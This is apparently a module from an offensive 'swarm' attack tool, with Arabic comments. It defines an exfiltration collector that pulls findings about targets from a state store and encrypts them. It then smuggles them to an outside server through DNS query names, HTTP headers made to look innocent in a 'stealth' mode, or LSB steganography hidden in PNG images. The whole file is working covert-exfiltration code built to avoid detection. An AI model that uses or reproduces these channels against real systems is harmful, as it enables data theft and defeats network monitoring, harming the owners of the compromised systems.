"""مجمع النتائج: يستخرج المكتشفات من قاعدة الحالة، يغلّفها تشفيرياً
(AES-256-GCM)، ثم يصدّرها عبر القناة المختارة: ملف / DNS / HTTP / إخفاء PNG.
"""
import json
import time
from datetime import datetime, timezone
from pathlib import Path


class ExfilCollector:
    def __init__(self, state, vault, policy, logger=None):
        self.state, self.vault, self.policy = state, vault, policy
        self.logger = logger

    async def build_manifest(self) -> dict:
        findings = await self.state.all_findings_decrypted()
        return {
            "generated": datetime.now(timezone.utc).isoformat(),
            "targets": self.policy.get("_targets", []),
            "count": len(findings),
            "findings": findings,
        }

    async def export_encrypted_file(self, name: str = "swarm_package") -> Path:
        """ملف .swarm.enc مشفر — لا يمكن فتحه دون SWARM_KEY."""
        manifest = await self.build_manifest()
        payload = self.vault.seal(json.dumps(manifest, ensure_ascii=False).encode())
        out = Path(self.policy["reporting"]["export_dir"]) / f"{name}_{int(time.time())}.swarm.enc"
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_bytes(payload)
        return out

    async def send_dns(self, domain: str, resolver: str = "8.8.8.8",
                       chunk_sleep: float = 0.4, dry_run: bool = False) -> int:
        """قناة DNS: الحمولة في QNAME لاستعلامات A — تُسجَّل على خادمك المخصص."""
        from .dns_channel import DNSChannel
        manifest = await self.build_manifest()
        payload = self.vault.seal(json.dumps(manifest, ensure_ascii=False).encode())
        ch = DNSChannel(domain=domain, resolver=resolver)
        return await ch.send(payload, sleep=chunk_sleep, dry_run=dry_run)

    async def send_http(self, transport, collector_url: str, mode: str = "stealth") -> dict:
        """قناة HTTP: الحمولة موزعة على رؤوس بريئة المظهر."""
        from .http_channel import HTTPChannel
        manifest = await self.build_manifest()
        payload = self.vault.seal(json.dumps(manifest, ensure_ascii=False).encode())
        return await HTTPChannel(transport, mode=mode).send(payload, collector_url)

    async def hide_png(self, cover: Path, out: Path | None = None) -> Path:
        """إخفاء الحمولة في LSB لصورة PNG (بدون أي مكتبة خارجية)."""
        from .stego_png import embed_payload
        manifest = await self.build_manifest()
        payload = self.vault.seal(json.dumps(manifest, ensure_ascii=False).encode())
        out = out or cover.with_name(cover.stem + "_stego.png")
        embed_payload(cover, out, payload)
        return out
